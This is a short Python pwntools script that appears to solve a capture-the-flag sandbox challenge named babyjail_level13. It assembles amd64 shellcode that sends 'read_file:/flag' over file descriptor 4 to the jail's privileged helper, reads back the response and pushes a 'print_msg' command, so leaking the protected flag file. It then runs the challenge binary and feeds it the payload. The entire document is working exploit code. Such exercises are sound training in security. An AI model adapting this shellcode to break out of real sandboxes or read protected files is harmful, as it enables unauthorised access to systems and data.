'''
openat
'''

from pwn import *

context.arch = "amd64"

my_sc = asm(shellcraft.write(4, "read_file:/flag", 0x20)+shellcraft.read(4, "rsp",0x50) + "mov rax, 0x7878787878783a67\npush rax\nmov rax, 0x736d5f746e697270\npush rax"+shellcraft.write(4, "rsp", 0x80) )
# display the bytes
#print(disasm(my_sc))
# fd = open("ttt-raw","wb+")
# fd.write(my_sc)
# fd.close()
# def preexec_openfd():
#     fd = os.open("/", flags=0x20000)
#     os.dup2(3, fd)

p = process(["/challenge/babyjail_level13", "/flag"])
#context.terminal = ['tmux', 'splitw', '-h']  # Attempting to use multixterm
#p = gdb.debug(["/challenge/babyjail_level13", "/flag"], gdbscript="source /opt/gef/gef.py")

p.send(my_sc)


